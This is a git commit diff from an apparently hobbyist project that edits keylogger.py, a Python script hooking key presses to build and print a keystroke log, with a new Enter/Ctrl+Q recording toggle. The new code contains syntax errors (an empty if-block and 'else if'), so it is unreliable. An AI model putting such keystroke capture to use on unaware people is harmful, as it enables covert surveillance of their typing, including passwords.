a12dd49f77eec47b2fa63eeb636d0ae698db1436
jyulin2000 <jyulin2000@gmail.com>
2020-07-04 13:11:33 -0400

    Outlined basic flow of program

--- keylogger.py
+++ keylogger.py
@@ -1,14 +1,23 @@
 import keyboard
-from threading import Semaphore, Timer
+from threading import Semaphore
 
 class Keylogger:
 	def __init__(self):
 		self.log = ""
 		self.semaphore = Semaphore(0)
-		self.esc_pressed = False	
+		self.recording = False
+	
 	def callback(self, event):
 		name = event.name
-		print(name)
+		
+		if self.recording:
+		
+		else:
+			if name == "enter":
+				self.recording = True
+			else if name == "ctrl+q":
+				self.semaphore.release()
+		
 		if len(name) > 1:
 			if name == "space": name = " "
 			elif name == "enter":
@@ -19,17 +28,15 @@ class Keylogger:
 			elif name == "decimal": name = "."
 			elif name == "esc": 
 				self.semaphore.release()
-				print("asdlfasdlf")
-				self.esc_pressed = True 
+		
 		self.log += name
 	
-	def writelog(self):
+	def write_log(self):
 		print(self.log)
+	
 	def start(self):
-		keyboard.on_release(callback=self.callback)
+		keyboard.on_press(callback=self.callback)
 		self.semaphore.acquire()
-		#while not self.esc_pressed:
-		#	continue
 
 if __name__ == "__main__":
 	keylogger = Keylogger()
